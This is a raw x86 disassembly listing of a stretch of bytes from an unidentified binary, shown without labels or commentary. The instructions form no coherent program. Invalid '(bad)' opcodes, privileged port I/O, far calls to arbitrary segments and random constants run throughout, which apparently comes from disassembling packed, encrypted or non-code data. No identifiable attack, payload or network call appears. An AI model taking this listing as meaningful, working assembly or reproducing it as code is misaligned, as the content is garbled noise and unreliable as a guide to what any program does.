  41fbe3:	outs   dx,BYTE PTR ds:[esi]
  41fbe4:	push   edx
  41fbe5:	pop    ebx
  41fbe6:	jle    0x41fc3d
  41fbe8:	out    dx,al
  41fbe9:	mov    al,0x4a
  41fbeb:	and    BYTE PTR [ebp+0x45649988],dh
  41fbf1:	call   0xe92b18ef
  41fbf6:	shl    BYTE PTR [ebx+0x244b1877],0xfa
  41fbfd:	in     al,dx
  41fbfe:	(bad)  
  41fbff:	jmp    0x619e:0x7bf75538
  41fc06:	inc    bp
  41fc08:	pop    ss
  41fc09:	ret    
  41fc0a:	or     eax,edi
  41fc0c:	fld    st(4)
  41fc0e:	mov    edi,edx
  41fc10:	and    al,0x45
  41fc12:	pop    edx
  41fc13:	pop    esi
  41fc14:	es mov db6,ebx
  41fc18:	xchg   dl,dl
  41fc1a:	xchg   ebp,eax
  41fc1b:	lahf   
  41fc1c:	faddp  st(2),st
  41fc1e:	pop    edi
  41fc1f:	cli    
  41fc20:	mov    edx,0x8751cce9
  41fc25:	mov    ch,0x31
  41fc27:	sub    eax,0x469ead74
  41fc2c:	xor    eax,0x7c5120f1
  41fc31:	pop    ss
  41fc32:	shl    al,1
  41fc34:	(bad)  
  41fc35:	xor    al,0xa3
  41fc37:	lods   eax,DWORD PTR ds:[esi]
  41fc38:	mov    DWORD PTR [esi],edi
  41fc3a:	sbb    edi,DWORD PTR ds:0xe66c528c
  41fc40:	adc    bl,0xda
  41fc43:	xchg   ecx,eax
  41fc44:	xchg   esp,eax
  41fc45:	outs   dx,DWORD PTR ds:[esi]
  41fc46:	dec    esp
  41fc47:	bound  edx,QWORD PTR [edx-0x65]
  41fc4a:	je     0x41fc20
  41fc4c:	repnz xchg esp,eax
  41fc4e:	std    
  41fc4f:	push   cs
  41fc50:	pop    eax
  41fc51:	arpl   WORD PTR [eax+ebx*2-0x7],sp
  41fc55:	sbb    ch,BYTE PTR [edx-0x3f0d8015]
  41fc5b:	daa    
  41fc5c:	push   cs
  41fc5d:	push   eax
  41fc5e:	ds inc esp
  41fc60:	pusha  
  41fc61:	call   DWORD PTR [esi]
  41fc63:	mov    bl,0xd7
  41fc65:	xor    ebp,DWORD PTR [edx+0x7c]
  41fc68:	xchg   esp,eax
  41fc69:	push   esp
  41fc6a:	xor    esp,DWORD PTR [ecx]
  41fc6c:	pop    ecx
  41fc6d:	adc    eax,0xfec532b4
  41fc72:	adc    BYTE PTR [esp+eax*2-0x203f11c0],dl
  41fc79:	mov    al,0x3f
  41fc7b:	lea    ebx,[edx]
  41fc7d:	mov    WORD PTR [edi-0x554ce773],ss
  41fc83:	rcl    DWORD PTR [ebx],cl
  41fc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc86:	xlat   BYTE PTR ds:[ebx]
  41fc87:	inc    ebx
  41fc88:	outs   dx,DWORD PTR fs:[esi]
  41fc8a:	push   edi
  41fc8b:	outs   dx,BYTE PTR ds:[esi]
  41fc8c:	add    BYTE PTR [eax],cl
  41fc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc8f:	cs inc ebx
  41fc91:	in     eax,0xdb
  41fc93:	mov    dh,0x6e
  41fc95:	arpl   WORD PTR [ebx+0x664f542e],bp
  41fc9b:	xor    esi,DWORD PTR [eax+ecx*1]
  41fc9e:	loopne 0x41fc2c
  41fca0:	fimul  WORD PTR [esi+0x13911d2c]
  41fca6:	adc    ch,bh
  41fca8:	lods   al,BYTE PTR ds:[esi]
  41fca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcaa:	or     eax,0x5791ec0c
  41fcaf:	jmp    0x41fc98
  41fcb1:	call   DWORD PTR [edx+0x7287b759]
  41fcb7:	dec    ebx
  41fcb8:	pop    ebp
  41fcb9:	jae    0x41fcdc
  41fcbb:	(bad)  
  41fcbc:	add    esi,esp
  41fcbe:	pop    esp
  41fcbf:	push   eax
  41fcc0:	or     eax,0x4622a560
  41fcc5:	test   eax,0xa23d81ee
  41fcca:	push   ebx
  41fccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fccc:	jnp    0x41fcb2
  41fcce:	scas   eax,DWORD PTR es:[edi]
  41fccf:	fs loopne 0x41fca8
  41fcd2:	(bad)  [edi+0x19788a74]
  41fcd8:	pop    esp
  41fcd9:	inc    esp
  41fcda:	inc    BYTE PTR [ebp+0x64433f30]
  41fce0:	ret    
  41fce1:	arpl   WORD PTR [edi-0x171ffdb6],bx
  41fce7:	dec    esp
  41fce8:	aaa    
  41fce9:	ret    0xb129
  41fcec:	(bad)  
  41fced:	sti    
  41fcee:	fidivr WORD PTR [edx+0x3a]
  41fcf1:	lahf   
  41fcf2:	jle    0x41fd50
  41fcf4:	ret    
  41fcf5:	rcl    DWORD PTR [ebp-0x4f],cl
  41fcf8:	cmp    bh,BYTE PTR [ebp+esi*4-0xfacd51e]
  41fcff:	test   dl,al
  41fd01:	add    edi,DWORD PTR [ebx]
  41fd03:	jl     0x41fcfd
  41fd05:	sbb    DWORD PTR [edx+0x29],ecx
  41fd08:	(bad)
  41fd0b:	dec    esp
  41fd0c:	test   ch,ch
  41fd0e:	adc    DWORD PTR [ebp+eiz*2+0x2c],ecx
  41fd12:	aad    0x6
  41fd14:	loop   0x41fcf6
  41fd16:	sbb    BYTE PTR [ebx+ebp*1+0x5b],0xe9
  41fd1b:	ja     0x41fd7c
  41fd1d:	stos   DWORD PTR es:[edi],eax
  41fd1e:	cmp    ah,BYTE PTR [ebp-0x5a]
  41fd21:	loope  0x41fcaa
  41fd23:	mov    DWORD PTR [edi+0x32],edi
  41fd26:	inc    ecx
  41fd27:	je     0x41fd31
  41fd29:	mov    dh,ah
  41fd2b:	stos   BYTE PTR es:[edi],al
  41fd2c:	mov    dx,0xd379
  41fd30:	aaa    
  41fd31:	or     ebp,DWORD PTR [eax-0x176ef73f]
  41fd37:	mov    edi,DWORD PTR [edx-0x61d4fdd0]
  41fd3d:	inc    ebp
  41fd3e:	cli    
  41fd3f:	cmp    al,0xcb
  41fd41:	jl     0x41fd30
  41fd43:	mov    al,ds:0xb7fa216b
  41fd48:	ja     0x41fd70
  41fd4a:	push   edx
  41fd4b:	push   esp
  41fd4c:	mov    esi,0x5a0fd151
  41fd51:	shr    BYTE PTR [ebx+0x24],0x27
  41fd55:	aam    0x28
  41fd57:	rcr    BYTE PTR gs:[edx],cl
  41fd5a:	out    dx,al
  41fd5b:	ins    DWORD PTR es:[edi],dx
  41fd5c:	inc    edi
  41fd5d:	dec    ecx
  41fd5e:	dec    ecx
  41fd5f:	xor    DWORD PTR [ecx+ecx*8-0x79],esp
  41fd63:	bound  ebx,QWORD PTR [esi-0x51]
  41fd66:	jne    0x41fd48
  41fd68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd69:	int    0x83
  41fd6b:	or     bl,BYTE PTR [eax+0x30]
  41fd6e:	cmp    esp,0x67d14745
  41fd74:	in     al,dx
  41fd75:	xchg   ecx,eax
  41fd76:	jne    0x41fcfc
  41fd78:	out    dx,eax
  41fd79:	mov    BYTE PTR [eax],bl
  41fd7b:	xlat   BYTE PTR ds:[ebx]
  41fd7c:	cwde   
  41fd7d:	xor    DWORD PTR [esi-0x7f],0x2e210c65
  41fd84:	in     al,0x1a
  41fd86:	and    BYTE PTR [ecx+0x21],dh
  41fd89:	adc    ecx,DWORD PTR [edi+ebp*4]
  41fd8c:	dec    edx
  41fd8d:	pop    ss
  41fd8e:	cmp    BYTE PTR [ebp+esi*2-0x36a0070e],dl
  41fd95:	or     edx,DWORD PTR [ebp+0x26f3d92c]
  41fd9b:	add    ah,ah
  41fd9d:	sbb    al,0x36
  41fd9f:	inc    ebp
  41fda0:	jge    0x41fd8e
  41fda2:	in     al,0xb1
  41fda4:	add    DWORD PTR [ecx-0x40],ecx
  41fda7:	test   DWORD PTR [ecx+0x6a],0x6417477d
  41fdae:	aas    
  41fdaf:	push   0x40fd2711
  41fdb4:	or     al,0x92
  41fdb6:	or     edx,esp
  41fdb8:	cmp    DWORD PTR [esp+ebp*1-0x501c4c2b],ecx
  41fdbf:	je     0x41fe2c
  41fdc1:	jbe    0x41fde5
  41fdc3:	push   ds
  41fdc4:	mov    dl,al
  41fdc6:	clc    
  41fdc7:	mov    ah,0xf9
  41fdc9:	test   al,0x6a
  41fdcb:	cmc    
  41fdcc:	add    eax,0xd01fbcab
  41fdd1:	lea    edx,[eax-0x396dd81a]
  41fdd7:	pop    eax
  41fdd8:	div    DWORD PTR [eax]
  41fdda:	and    eax,0x8d6ec324
  41fddf:	adc    ah,BYTE PTR [edi-0x6d]
  41fde2:	dec    eax
  41fde3:	rcl    DWORD PTR [ebx],cl
  41fde5:	mov    dh,0x7f
  41fde7:	and    BYTE PTR [esi+0x48],bl
  41fdea:	ds xchg esi,eax
  41fdec:	pop    edi
  41fded:	mov    edx,0x683c3a5b
  41fdf2:	mov    edx,0x34ad0d67
  41fdf7:	loope  0x41fe17
  41fdf9:	loope  0x41fda3
  41fdfb:	pop    es
  41fdfc:	pop    ds
  41fdfd:	das    
  41fdfe:	mov    esi,0xaae31aef
  41fe03:	call   0x7b5c:0x3dd25c46
  41fe0a:	out    0x32,al
  41fe0c:	fisttp WORD PTR ds:0x81e48b24
  41fe12:	sub    bl,BYTE PTR [eax+0x9]
  41fe15:	jle    0x41fdb1
  41fe17:	les    eax,FWORD PTR [eax+0xc]
  41fe1a:	push   ss
  41fe1b:	inc    esp
  41fe1c:	cdq    
  41fe1d:	push   0x43
  41fe1f:	stc    
  41fe20:	outs   dx,BYTE PTR ds:[esi]
  41fe21:	out    0xc3,al
  41fe23:	arpl   WORD PTR [ebp-0x18],bp
  41fe26:	imul   ecx,DWORD PTR [esi],0x9846ad5a
  41fe2c:	pop    ss
  41fe2d:	and    ah,BYTE PTR [edx]
  41fe2f:	and    eax,0x113d430e
  41fe34:	jle    0x41fe1b
  41fe36:	sub    eax,0xdb42a7b9
  41fe3b:	retf   0xad4a
  41fe3e:	ret    
  41fe3f:	sbb    al,0x1a
  41fe41:	cwde   
  41fe42:	cli    
  41fe43:	dec    ebx
  41fe44:	pop    esi
  41fe45:	sub    eax,0x687b88ae
  41fe4a:	nop
  41fe4b:	mov    bl,0xc6
  41fe4d:	sub    eax,0xb2c39ab7
  41fe52:	cmp    cl,BYTE PTR [eax+0x60]
  41fe55:	daa    
  41fe56:	jmp    0x41feb0
  41fe58:	imul   edi,DWORD PTR [esi+0x7],0xffffffdd
  41fe5c:	aad    0xd
  41fe5e:	test   edx,esp
  41fe60:	shr    dh,1
  41fe62:	aam    0x4e
  41fe64:	mov    ebp,0xefe33337
  41fe69:	inc    edx
  41fe6a:	out    dx,eax
  41fe6b:	inc    esp
  41fe6c:	adc    DWORD PTR [ecx-0x46],0x9ec906c3
  41fe73:	pop    eax
  41fe74:	test   DWORD PTR [edx+0x9e8de72],eax
  41fe7a:	repz data16 (bad) 
  41fe7d:	ja     0x41fe5b
  41fe7f:	pop    esi
  41fe80:	clc    
  41fe81:	xor    eax,DWORD PTR [esi]
  41fe83:	mov    eax,DWORD PTR [edi+0x4b]
  41fe86:	push   ecx
  41fe87:	mov    cl,0x7a
  41fe89:	cld    
  41fe8a:	cwde   
  41fe8b:	ficomp DWORD PTR [edx+0x4d72c2bb]
  41fe91:	imul   ebp,DWORD PTR [ecx-0x4b809526],0xeb03be48
  41fe9b:	into   
  41fe9c:	xchg   edx,eax
  41fe9d:	clc    
  41fe9e:	das    
  41fe9f:	test   DWORD PTR [ebx-0x7d72837d],esp
  41fea5:	mov    al,0x93
  41fea7:	sub    BYTE PTR [edx+0x72e689bc],0x29
  41feae:	dec    esi
  41feaf:	xchg   BYTE PTR [ecx+edx*4+0x5ed882cf],cl
  41feb6:	fadd   QWORD PTR [ebx]
  41feb8:	fcomp  QWORD PTR [edi-0x5f]
  41febb:	rol    al,0x5b
  41febe:	adc    dl,al
  41fec0:	adc    BYTE PTR [edx+0x20],dh
  41fec3:	or     esp,esi
  41fec5:	pop    ebx
  41fec6:	call   0xddcd:0x7f81f6ae
  41fecd:	shl    WORD PTR es:[esi],cl
  41fed1:	add    BYTE PTR [edx-0x58b51195],ah
  41fed7:	jo     0x41ff44
  41fed9:	inc    esi
  41feda:	mov    bh,0xfd
  41fedc:	mov    eax,ds:0x1a5b8906
  41fee1:	xchg   BYTE PTR [ecx],al
  41fee3:	inc    edi
  41fee4:	pop    ds
  41fee5:	mov    esi,0xe5813553
  41feea:	lods   eax,DWORD PTR ds:[esi]
  41feeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feec:	daa    
  41feed:	mov    BYTE PTR [ecx-0x1e],0xae
  41fef1:	fild   WORD PTR [ebx+0x32]
  41fef4:	je     0x41ff04
  41fef6:	xchg   edi,eax
  41fef7:	frstor [ebp+0x4c42c0f3]
  41fefd:	sti    
  41fefe:	and    al,0x46
  41ff00:	adc    DWORD PTR [edi-0x1d3e78f],esp
  41ff06:	add    DWORD PTR [esi-0x4360c88],eax
  41ff0c:	dec    ebx
  41ff0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0e:	jp     0x41fe9b
  41ff10:	adc    cl,cl
  41ff12:	rcr    BYTE PTR [edx+0x5a8c95a5],1
  41ff18:	cmp    BYTE PTR [ecx],cl
  41ff1a:	das    
  41ff1b:	scas   eax,DWORD PTR es:[edi]
  41ff1c:	fadd   QWORD PTR [ebp+ebx*2-0x4b]
  41ff20:	popa   
  41ff21:	shl    dh,1
  41ff23:	mov    dh,0x66
  41ff25:	jp     0x41ff1e
  41ff27:	and    ebp,DWORD PTR [ebp+0x144ebd0b]
  41ff2d:	push   es
  41ff2e:	xchg   esp,eax
  41ff2f:	jmp    0x4c958108
  41ff34:	push   0xddf49dbf
  41ff39:	retf   0x3050
  41ff3c:	xor    BYTE PTR [ebp+eiz*4+0x36],dl
  41ff40:	scas   eax,DWORD PTR es:[edi]
  41ff41:	mov    dh,0x80
  41ff43:	test   BYTE PTR ds:0x1c5929d7,dh
  41ff49:	inc    ecx
  41ff4a:	fwait
  41ff4b:	pop    es
  41ff4c:	push   edx
  41ff4d:	push   es
  41ff4e:	sbb    DWORD PTR [edx+edx*2+0x1],edx
  41ff52:	adc    DWORD PTR ds:0xba1c302a,0x64f2c3b4
  41ff5c:	sbb    BYTE PTR [ebx+ebx*1+0x16656076],0xe0
  41ff64:	dec    ebx
  41ff65:	int    0xd8
  41ff67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff68:	push   esp
  41ff69:	mov    ah,0x69
  41ff6b:	mov    bh,0x68
  41ff6d:	ins    BYTE PTR es:[edi],dx
  41ff6e:	add    dh,BYTE PTR [ebx]
  41ff70:	mov    DWORD PTR [edx+0x3f],edi
  41ff73:	arpl   WORD PTR [esi],ax
  41ff75:	push   esi
  41ff76:	push   esi
  41ff77:	ins    DWORD PTR es:[edi],dx
  41ff78:	xchg   edi,eax
  41ff79:	std    
  41ff7a:	xchg   ebp,eax
  41ff7b:	mov    al,ds:0x5b2f4a7d
  41ff80:	push   edi
  41ff81:	dec    eax
  41ff82:	push   edi
  41ff83:	push   eax
  41ff84:	adc    cl,ch
  41ff86:	push   ebp
  41ff87:	add    BYTE PTR [ebp-0x68],ah
  41ff8a:	je     0x41ffad
  41ff8c:	loopne 0x41ff58
  41ff8e:	pop    ds
  41ff8f:	popa   
  41ff90:	inc    eax
  41ff91:	icebp  
  41ff92:	inc    ebx
  41ff93:	int    0x98
  41ff95:	add    dh,BYTE PTR [eax-0x1c8f717c]
  41ff9b:	shl    BYTE PTR [ebx],cl
  41ff9d:	test   eax,0xd74e27d4
  41ffa2:	and    eax,0xd52426d6
  41ffa7:	inc    edi
  41ffa8:	add    BYTE PTR [esi-0x3c],dl
  41ffab:	xlat   BYTE PTR ds:[ebx]
  41ffac:	inc    esi
  41ffad:	stos   DWORD PTR es:[edi],eax
  41ffae:	into   
  41ffaf:	(bad)  
  41ffb0:	dec    ebp
  41ffb1:	mov    bl,0xdc
  41ffb3:	xor    eax,DWORD PTR [ebp+0xe]
  41ffb6:	fs cmp al,0x7a
  41ffb9:	mov    esi,0xb5af9277
  41ffbe:	aam    0x11
  41ffc0:	push   edi
  41ffc1:	sahf   
  41ffc2:	adc    eax,0x98d72b3d
  41ffc7:	sbb    DWORD PTR [esi+0x42],0x66
  41ffcb:	jbe    0x41ff54
  41ffcd:	jecxz  0x42003a
  41ffcf:	aam    0x0
  41ffd1:	pop    esp
  41ffd2:	gs repz mov al,0x1b
  41ffd6:	test   DWORD PTR [esi-0x7b],esi
  41ffd9:	inc    ecx
  41ffda:	repnz mov ds:0xe5636a8b,eax
  41ffe0:	std    
  41ffe1:	call   FWORD PTR [eax+edi*4-0x7ad33d1a]
  41ffe8:	jo     0x42002a
  41ffea:	leave  
  41ffeb:	cli    
  41ffec:	sbb    BYTE PTR [eax],cl
  41ffee:	pop    ds
  41ffef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fff0:	mov    ebx,0x6802e50a
  41fff5:	or     BYTE PTR [ebx-0x1a6038ad],0x8e
  41fffc:	mov    edi,edi
  41fffe:	xchg   BYTE PTR ds:0xddca3010,ah
  420004:	xchg   ebp,eax
  420005:	xchg   bh,dl
  420007:	call   0xf39a496
  42000c:	adc    bh,dh
  42000e:	or     dl,BYTE PTR [eax-0x13]
  420011:	mov    ds:0xf6513934,eax
  420016:	add    eax,0x5ed882a9
  42001b:	call   0xa0c6:0x8b25a1ce
  420022:	jg     0x41fffb
  420024:	adc    dh,BYTE PTR ds:0xcf3cca9f
  42002a:	out    dx,al
  42002b:	(bad)  
  42002c:	or     DWORD PTR [esp+ebx*2-0x72],ebp
  420030:	lea    esp,[ebx-0x67]
  420033:	xchg   ebp,eax
  420034:	mov    esi,0xbda7f393
  420039:	inc    ebx
  42003a:	inc    eax
  42003b:	arpl   WORD PTR [edi*8+0x5bbd71af],dx
  420042:	mov    esi,0x40018cf7
  420047:	retf   0x4826
  42004a:	fwait
  42004b:	pushf  
  42004c:	xchg   ecx,eax
  42004d:	pop    esi
  42004e:	fbstp  TBYTE PTR [esi-0x2b]
  420051:	and    ch,BYTE PTR [ecx+ebp*4+0x21714109]
  420058:	xlat   BYTE PTR ds:[ebx]
  420059:	xchg   ebx,eax
  42005a:	or     eax,0x2733de01
  42005f:	add    al,0x18
  420061:	int3   
  420062:	lahf   
  420063:	rcr    DWORD PTR [edi],1
  420065:	push   ebx
  420066:	out    dx,al
  420067:	jmp    0x51afbdbc
  42006c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42006d:	mov    ?,WORD PTR [ebx-0x32cb2164]
  420073:	in     al,0x83
  420075:	cdq    
  420076:	mov    esp,0xc330e421
  42007b:	dec    edi
  42007c:	popa   
  42007d:	outs   dx,DWORD PTR ds:[esi]
  42007e:	jg     0x420031
  420080:	push   esi
  420081:	jns    0x420079
  420083:	loop   0x4200f0
  420085:	pop    esi
  420086:	push   es
  420087:	jae    0x42002a
  420089:	imul   edx,DWORD PTR [edi+0x5ca18f2d],0xffffffd5
  420090:	cmp    DWORD PTR [ecx-0xd],eax
  420093:	arpl   cx,si
  420095:	das    
  420096:	xor    BYTE PTR [ecx+0x6cc2fa12],0x82
  42009d:	std    
  42009e:	sub    esi,DWORD PTR [ebp+0x53050fd8]
  4200a4:	sub    esi,ebx
  4200a6:	mov    eax,ds:0xeb323217
  4200ab:	dec    edx
  4200ac:	xchg   esp,eax
  4200ad:	push   cs
  4200ae:	adc    edi,eax
  4200b0:	and    eax,0xc885bbc9
  4200b5:	mov    edi,DWORD PTR [edx]
  4200b7:	cmp    DWORD PTR [esi],esi
  4200b9:	inc    ebx
  4200ba:	in     al,dx
  4200bb:	aad    0xec
  4200bd:	outs   dx,DWORD PTR ds:[esi]
  4200be:	push   ss
  4200bf:	nop
  4200c0:	adc    BYTE PTR [ebx-0xc],0x95
  4200c4:	call   0x3820:0x37fc551e
  4200cb:	imul   eax,esp,0xffffffde
  4200ce:	xor    dh,bh
  4200d0:	fs pop eax
  4200d2:	loopne 0x420088
  4200d4:	leave  
  4200d5:	cmp    eax,0x3222798b
  4200da:	xor    eax,DWORD PTR [ecx]
  4200dc:	(bad)  
  4200dd:	pushf  
  4200de:	mov    ecx,0x7658d2d7
  4200e3:	cli    
  4200e4:	aaa    
  4200e5:	sahf   
  4200e6:	sbb    eax,0x3e92935e
  4200eb:	add    eax,0x3296e66c
  4200f0:	call   0x973e9d92
  4200f5:	repnz fcom QWORD PTR [ebx-0x1ce44f08]
  4200fc:	pop    esi
  4200fd:	inc    ebx
  4200fe:	lods   al,BYTE PTR ds:[esi]
  4200ff:	adc    eax,0x3d7b667f
  420104:	pop    ebx
  420105:	xchg   DWORD PTR ss:[edi],edx
  420108:	iret   
  420109:	daa    
  42010a:	adc    BYTE PTR [ebp-0x5a],ch
  42010d:	add    ecx,ebx
  42010f:	inc    ebx
  420110:	push   eax
  420111:	ret    
  420112:	ja     0x420095
  420114:	call   0x6474:0xa645a11d
  42011b:	mov    ecx,esi
  42011d:	fdiv   QWORD PTR [ecx-0x33]
  420120:	adc    ebp,DWORD PTR [edx-0x6f]
  420123:	sti    
  420124:	loopne 0x4200bc
  420126:	pop    edx
  420127:	or     al,0x59
  420129:	pop    esp
  42012a:	pop    ecx
  42012b:	clc    
  42012c:	push   ecx
  42012d:	scas   al,BYTE PTR es:[edi]
  42012e:	xor    cl,BYTE PTR [edi]
  420130:	loopne 0x420133
  420132:	mov    bh,0x55
  420134:	jns    0x4200ff
  420136:	not    BYTE PTR fs:[esi]
  420139:	and    al,0x1c
  42013b:	jns    0x4201b0
  42013d:	inc    ebx
  42013e:	(bad)  
  42013f:	jno    0x420174
  420141:	outs   dx,BYTE PTR ds:[esi]
  420142:	xor    eax,0xe8c6ab9f
  420147:	mov    esp,0x12bec61b
  42014c:	or     dh,BYTE PTR [ecx-0x17a79300]
  420152:	sub    DWORD PTR [eax-0x5a],0xcd5d0eff
  420159:	ja     0x420145
  42015b:	into   
  42015c:	and    dl,BYTE PTR [ebp-0x44]
  42015f:	pop    edi
  420160:	adc    edx,DWORD PTR [eax]
  420162:	fidiv  WORD PTR [ecx]
  420164:	xor    BYTE PTR [edx],al
  420166:	nop
  420167:	jb     0x42014e
  420169:	fdivr  DWORD PTR [esi-0x4c]
  42016c:	mov    ebp,0x38fcfa3c
  420171:	jb     0x420180
  420173:	or     al,0xf2
  420175:	fld    DWORD PTR [edx+0x1913a414]
  42017b:	push   esp
  42017c:	adc    edx,edx
  42017e:	adc    DWORD PTR [eax*4+0x317136e2],esi
  420185:	xchg   esp,eax
  420186:	jmp    0x7605880e
  42018b:	xchg   esp,eax
  42018c:	xchg   edx,eax
  42018d:	out    0xf8,eax
  42018f:	pop    ds
  420190:	jae    0x4201ec
  420192:	xor    ecx,esp
  420194:	mov    ah,BYTE PTR [ebx+0x65a2571e]
  42019a:	shl    BYTE PTR [ebx-0x66be3a59],0x50
  4201a1:	or     ebx,DWORD PTR [edi]
  4201a3:	ror    DWORD PTR [esi+ecx*4],0xee
  4201a7:	mov    bh,0x8c
  4201a9:	mov    ah,BYTE PTR [edx+0x13]
  4201ac:	loope  0x42017f
  4201ae:	xchg   BYTE PTR [ebx],bl
  4201b0:	imul   edi,DWORD PTR [ebp+edi*8-0x14],0xdaf592ab
  4201b8:	fsub   st,st(4)
  4201ba:	pop    ss
  4201bb:	dec    ecx
  4201bc:	pusha  
  4201bd:	jle    0x4201c5
  4201bf:	sti    
  4201c0:	stos   DWORD PTR es:[edi],eax
  4201c1:	mov    bh,dl
  4201c3:	xor    eax,0x286a77b1
  4201c8:	adc    BYTE PTR [eax+0x3a36552],0xae
  4201cf:	repnz xchg edi,eax
  4201d1:	ror    DWORD PTR [eax+0x64],1
  4201d4:	(bad)  
  4201d5:	push   0xfffffff0
  4201d7:	dec    esi
  4201d8:	stos   DWORD PTR es:[edi],eax
  4201d9:	std    
  4201da:	sub    edi,DWORD PTR [ebx+0x70]
  4201dd:	xor    al,BYTE PTR [edi]
  4201df:	aaa    
  4201e0:	je     0x420167
  4201e2:	dec    ebp
  4201e3:	ins    BYTE PTR es:[edi],dx
  4201e4:	jp     0x4201c5
  4201e6:	pop    ds
  4201e7:	jmp    0x70d9:0xe22c5116
  4201ee:	lea    edx,[edi-0x47]
  4201f1:	sbb    eax,0x949bcd7f
  4201f6:	icebp  
  4201f7:	inc    ebx
  4201f8:	jle    0x42025a
  4201fa:	sub    esi,DWORD PTR [esi+0x61]
  4201fd:	ret    0x585c
  420200:	push   esi
  420201:	push   ebx
  420202:	popf   
  420203:	adc    eax,0xde8b1a60
  420208:	jle    0x42022e
  42020a:	pusha  
  42020b:	sub    BYTE PTR [ebx-0x56],ch
  42020e:	test   eax,0x5131aee8
  420213:	jg     0x420252
  420215:	mov    al,0xba
  420217:	bound  esi,QWORD PTR [ebx]
  420219:	pop    edx
  42021a:	rcl    BYTE PTR [edi],1
  42021c:	(bad)  
  42021d:	imul   esp,esi,0x2c47a28a
  420223:	xchg   BYTE PTR [ecx+0x4b],bl
  420226:	imul   edx,DWORD PTR [ebp+0x21777930],0x5a20a9a8
  420230:	push   es
  420231:	xlat   BYTE PTR ds:[ebx]
  420232:	push   eax
  420233:	mov    ch,0x78
  420235:	xor    BYTE PTR [esi*8+0x6614ee9a],0xe9
  42023d:	pop    esi
  42023e:	inc    edx
  42023f:	sub    eax,0xafe3a913
  420244:	shr    BYTE PTR [ebp+0x32],0x13
  420248:	sbb    dh,bh
  42024a:	inc    ecx
  42024b:	shl    DWORD PTR [edi],0x5d
  42024e:	pop    ebp
  42024f:	int    0xd2
  420251:	stos   BYTE PTR es:[edi],al
  420252:	mov    fs,WORD PTR [esi+ebp*1-0x6c34d1f6]
  420259:	mov    ds:0x9dbdfab4,al
  42025f:	(bad)  
  420260:	xchg   DWORD PTR [esi-0x7f],ebp
  420263:	xchg   ebx,eax
  420264:	dec    edx
  420265:	add    eax,0xe7970177
  42026a:	push   ss
  42026b:	or     al,0xa5
  42026d:	daa    
  42026e:	je     0x42028e
  420270:	std    
  420271:	sahf   
  420272:	lock xchg ebp,eax
  420274:	xchg   edi,eax
  420275:	ret    0x6170
  420278:	shl    DWORD PTR [edx-0x523c22a6],0x37
  42027f:	or     DWORD PTR [edi+0x5c2d94b8],eax
  420285:	cwde   
  420286:	mov    dh,0x44
  420288:	push   es
  420289:	imul   eax,DWORD PTR [edi-0x75],0xdb072b37
  420290:	sahf   
  420291:	inc    edx
  420292:	ss es jg 0x42021f
  420296:	add    DWORD PTR [edx+ebx*4+0x14006fdf],0xffffffe2
  42029e:	bound  ebx,QWORD PTR [edx+eiz*2+0x3403f20d]
  4202a5:	in     al,dx
  4202a6:	aad    0xec
  4202a8:	ss adc eax,0x315e1de4
  4202ae:	aas    
  4202af:	adc    ebx,DWORD PTR [edi-0x48]
  4202b2:	dec    ebx
  4202b3:	mov    eax,ds:0xba439428
  4202b8:	dec    ebp
  4202b9:	jg     0x4202e2
  4202bb:	mov    edi,0x9325b1
  4202c0:	jmp    0x420333
  4202c2:	mov    es,WORD PTR [ecx-0x51df1e97]
  4202c8:	and    al,BYTE PTR [ebx-0x5ae294cb]
  4202ce:	sbb    al,0x59
  4202d0:	mov    WORD PTR [ebp-0x2f],ss
  4202d3:	repnz add al,0x5f
  4202d6:	inc    ecx
  4202d7:	popa   
  4202d8:	pop    eax
  4202d9:	sbb    ax,0xc19f
  4202dd:	iret   
  4202de:	adc    al,0x9e
  4202e0:	loopne 0x420351
  4202e2:	add    eax,0x9bcac243
  4202e7:	lahf   
  4202e8:	pusha  
  4202e9:	ja     0x420368
  4202eb:	aam    0x48
  4202ed:	push   esi
  4202ee:	push   ebx
  4202ef:	add    al,0x8
  4202f1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4202f3:	test   BYTE PTR [ebx],dh
  4202f5:	js     0x4202cc
  4202f7:	inc    esi
  4202f8:	xchg   esi,eax
  4202f9:	add    BYTE PTR [esp+esi*1+0xd744baf],0x38
  420301:	and    eax,0xd1fd0bf
  420306:	and    eax,0x7fc4620d
  42030b:	aas    
  42030c:	cs jge 0x420377
  42030f:	fild   QWORD PTR [edi+0x46]
  420312:	ret    0xaf03
  420315:	xchg   edx,eax
  420316:	or     bh,BYTE PTR [ecx-0xbcf65a1]
  42031c:	xor    bl,BYTE PTR [ebx-0x7db0cc8a]
  420322:	ja     0x420328
  420324:	jmp    0x1ace1169
  420329:	lock pusha 
  42032b:	rol    BYTE PTR [eax+eiz*1],1
  42032e:	repz xlat BYTE PTR ds:[ebx]
  420330:	test   BYTE PTR [eax-0xe],dh
  420333:	enter  0xec45,0x35
  420337:	sti    
  420338:	sub    ch,BYTE PTR [edi+0xc840f5f]
  42033e:	dec    edi
  42033f:	(bad)  
  420341:	out    dx,eax
  420342:	in     eax,dx
  420343:	adc    esp,DWORD PTR [edi+0x10508f6b]
  420349:	les    edx,FWORD PTR [edi-0x2920b88b]
  42034f:	add    ebp,DWORD PTR [esi-0x77214b4a]
  420355:	sbb    bl,cl
  420357:	xor    eax,ebx
  420359:	repz sti 
  42035b:	fcom   QWORD PTR [esi+0x79]
  42035e:	mov    ah,0x1f
  420360:	cs push ss
  420362:	enter  0xf496,0xe5
  420366:	push   0x16
  420368:	or     bl,BYTE PTR ds:0x9fcd6d09
  42036e:	add    dh,dl
  420370:	outs   dx,DWORD PTR ds:[esi]
  420371:	call   0x625c4220
  420376:	dec    esp
  420377:	or     bh,bh
  420379:	push   edi
  42037a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42037b:	push   0x1ec1b3f9
  420380:	mov    dh,0x0
